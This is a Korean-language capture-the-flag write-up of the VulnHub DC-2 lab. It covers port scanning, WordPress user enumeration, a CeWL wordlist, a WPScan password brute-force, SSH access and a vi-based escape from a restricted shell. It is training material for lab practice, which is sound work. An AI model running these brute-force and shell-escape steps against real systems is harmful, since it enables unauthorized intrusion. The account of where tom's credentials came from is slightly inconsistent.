# 🏴 DC-2 — CTF Writeup

<img width="433" height="533" alt="Image" src="https://github.com/user-attachments/assets/a778ffb6-452c-44dc-85fa-6f97788123dc" />

> **Platform:** VulnHub | **URL:** https://www.vulnhub.com/entry/dc-2,311/
> **Goal:** 플래그 전체 획득 + root 쉘
> **핵심 기술:** CeWL, WPScan, WordPress, SSH, vi 쉘 탈출, PATH 복구

---

## 📡 1단계: 네트워크 & 포트 스캔

```bash
nmap -sn 172.16.11.0/24
```
> 네트워크 대역에서 살아있는 호스트 탐색 → 타겟 IP 확인

<img width="785" height="334" alt="Image" src="https://github.com/user-attachments/assets/6cee033e-500f-482f-a7fb-a84d4c5f046a" />

```bash
nmap -sC -sV -Pn -p- 172.16.11.228
```

<img width="798" height="408" alt="Image" src="https://github.com/user-attachments/assets/09a9284a-17e8-47bf-87fa-e7d83a4dcddd" />

> `-sC` 기본 스크립트 / `-sV` 버전 탐지 / `-Pn` ping 생략 / `-p-` 전체 포트
>
> ⚠️ 스캔 결과에서 80번 포트가 `http://dc-2/`로 리다이렉트되는 문구 확인
> → `/etc/hosts`에 도메인 등록 필수!

---

## 🌐 2단계: 도메인 등록

```bash
sudo vi /etc/hosts
```

아래 줄 추가:
```
172.16.11.228    dc-2
```

> 브라우저/도구가 `dc-2` 도메인을 IP로 해석할 수 있게 로컬 DNS 역할 수행

<img width="889" height="426" alt="Image" src="https://github.com/user-attachments/assets/bdf7f37d-df00-4504-88cd-693d783b2a2b" />

<img width="1148" height="768" alt="Image" src="https://github.com/user-attachments/assets/a2b74b17-d3b2-4a50-bf40-3a35de7ad920" />

---

## 👤 3단계: WordPress 사용자 열거

```bash
nmap -p80 --script http-wordpress-users -Pn 172.16.11.228
```
> Nmap 스크립트로 WordPress 등록 사용자 목록 추출

```bash
sudo vi user.txt
```
```
admin
tom
jerry
```
> 발견된 사용자 목록을 파일로 저장 → 이후 브루트포스에 사용

---

## 📝 4단계: CeWL로 맞춤 wordlist 생성

```bash
cewl http://dc-2/ -w wordlist.txt
```

> **CeWL (Custom Word List generator)**
> 대상 웹사이트를 크롤링해서 페이지에 등장하는 단어들로
> 맞춤형 패스워드 사전을 자동 생성하는 도구
>
> 💡 왜 쓰나?
> - `rockyou.txt` 같은 범용 사전보다 **해당 사이트 고유 단어**가 실제 비번일 확률 높음
> - 회사명, 제품명, 도메인 관련 단어 등이 비번으로 쓰이는 경우가 많음

---

## 🔓 5단계: WPScan으로 WordPress 브루트포스

```bash
wpscan --url http://dc-2/ -U user.txt -P wordlist.txt --password-attack wp-login
```

> `-U user.txt` 사용자 목록 지정
> `-P wordlist.txt` 패스워드 사전 지정
> `--password-attack wp-login` WordPress 로그인 폼으로 공격

> → **jerry** 계정 크리덴셜 획득 성공

<img width="927" height="795" alt="Image" src="https://github.com/user-attachments/assets/904a6410-d8c7-499c-800e-461958402035" />


---

## 🏁 6단계: WordPress 내부 — Flag 2 획득

> jerry 계정으로 WordPress 관리자 페이지 로그인
> Pages 섹션에서 `flag2.txt` 발견

```
Flag 2: [획득]
```

> 힌트 메시지:
> "If you can't exploit WordPress and take a shortcut,
>  there is another way. Hope you found another entry point."
> → SSH로 진입 방향 전환

---

## 🔐 7단계: SSH 접속 (tom 계정)

```bash
ssh tom@172.16.11.228
```

> WPScan에서 획득한 tom 계정 크리덴셜로 SSH 접속
> 접속 후 **rbash (restricted bash)** 환경 확인
> → 명령어 대부분 차단된 제한 쉘 상태

---

## 🚪 8단계: vi로 제한 쉘(rbash) 탈출

```bash
vi
```

vi 편집기 내부에서:
```vim
:set shell=/bin/sh
:shell
```

> **왜 이걸 쓰나?**
> vi/vim은 내부에서 쉘 명령을 실행하는 기능이 있음
> rbash가 외부 명령을 막아도 **vi 안에서 쉘을 실행하면 rbash를 우회** 가능
> `:set shell=` 로 실행할 쉘 지정 → `:shell` 로 해당 쉘 실행

<img width="864" height="89" alt="Image" src="https://github.com/user-attachments/assets/0a1bab4a-9b72-40e3-ae1f-ece43f5b037b" />


---

## 🛠️ 9단계: PATH 및 SHELL 복구

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
```

<img width="881" height="105" alt="Image" src="https://github.com/user-attachments/assets/93eaae0e-4e66-4f08-b8e4-a916802a73e2" />

> **왜 이걸 쓰나?**
>
> rbash 탈출 직후엔 환경변수가 망가진 상태라
> `ls`, `cat` 같은 기본 명령어도 "not found" 뜨는 경우가 있음
>
> `PATH` → 명령어 파일들이 어디 있는지 시스템이 찾는 경로 목록 복구
> `SHELL` → 현재 쉘을 bash로 명시적 지정
>
> 이 두 줄로 **정상적인 bash 환경** 복원 완료

> 최종 루트플래그까지
<img width="887" height="958" alt="Image" src="https://github.com/user-attachments/assets/baf0c150-b6bd-4d50-a0d0-b499ba38e69e" />

---

## 🗺️ 공격 흐름 요약

```
네트워크 스캔 → 포트 스캔 (80, SSH 확인)
      ↓
/etc/hosts 도메인 등록 (dc-2)
      ↓
WordPress 사용자 열거 (admin, tom, jerry)
      ↓
CeWL로 사이트 맞춤 wordlist 생성
      ↓
WPScan 브루트포스 → jerry 로그인 성공
      ↓
WordPress Pages → Flag 2 획득 🏁
      ↓
SSH tom 계정 접속 → rbash 제한 쉘
      ↓
vi → :set shell=/bin/sh → :shell (rbash 탈출)
      ↓
PATH / SHELL 환경변수 복구 → 정상 bash 환경
```

---

## 🛠️ 사용 도구

| 도구 | 용도 |
|------|------|
| `nmap` | 호스트/포트/WordPress 사용자 열거 |
| `cewl` | 사이트 크롤링 기반 맞춤 wordlist 생성 |
| `wpscan` | WordPress 브루트포스 |
| `vi` | rbash 제한 쉘 탈출 |
| `export` | PATH/SHELL 환경변수 복구 |
